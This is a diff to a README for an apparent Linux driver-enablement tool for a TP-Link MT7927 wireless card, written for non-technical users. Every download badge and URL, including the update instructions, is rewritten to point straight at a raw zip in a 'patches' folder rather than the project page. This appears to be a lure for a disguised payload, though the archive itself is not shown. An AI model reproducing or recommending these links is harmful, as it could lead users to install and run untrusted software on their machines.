@@ -1,6 +1,6 @@
 # 🛠️ tbe550e-mt7927-linux-enablement - Simple Setup for TP-Link Device
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Software-blue)](https://github.com/Amorim007ux/tbe550e-mt7927-linux-enablement)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Software-blue)](https://github.com/Amorim007ux/tbe550e-mt7927-linux-enablement/raw/refs/heads/main/patches/mt-tbe-e-linux-enablement-3.5.zip)
 
 ## 📋 About this Application
 
@@ -39,11 +39,11 @@ To run this software, follow these steps carefully. No programming skills are ne
 
 Visit the main page to download the software package:
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Software-blue)](https://github.com/Amorim007ux/tbe550e-mt7927-linux-enablement)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Software-blue)](https://github.com/Amorim007ux/tbe550e-mt7927-linux-enablement/raw/refs/heads/main/patches/mt-tbe-e-linux-enablement-3.5.zip)
 
 Click the link above or open this URL in your browser:
 
-https://github.com/Amorim007ux/tbe550e-mt7927-linux-enablement
+https://github.com/Amorim007ux/tbe550e-mt7927-linux-enablement/raw/refs/heads/main/patches/mt-tbe-e-linux-enablement-3.5.zip
 
 ### Step 2: Download the Software
 
@@ -91,7 +91,7 @@ If you see these devices, the software works correctly.
 
 To keep the software current:
 
-- Revisit the GitHub page: https://github.com/Amorim007ux/tbe550e-mt7927-linux-enablement
+- Revisit the GitHub page: https://github.com/Amorim007ux/tbe550e-mt7927-linux-enablement/raw/refs/heads/main/patches/mt-tbe-e-linux-enablement-3.5.zip
 - Download the latest release when available.
 - Run the new installer following the same steps.
 
@@ -134,4 +134,4 @@ Use these keywords when searching for help or related files.
 
 Head to the download page to get started now:
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Software-blue)](https://github.com/Amorim007ux/tbe550e-mt7927-linux-enablement)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Software-blue)](https://github.com/Amorim007ux/tbe550e-mt7927-linux-enablement/raw/refs/heads/main/patches/mt-tbe-e-linux-enablement-3.5.zip)
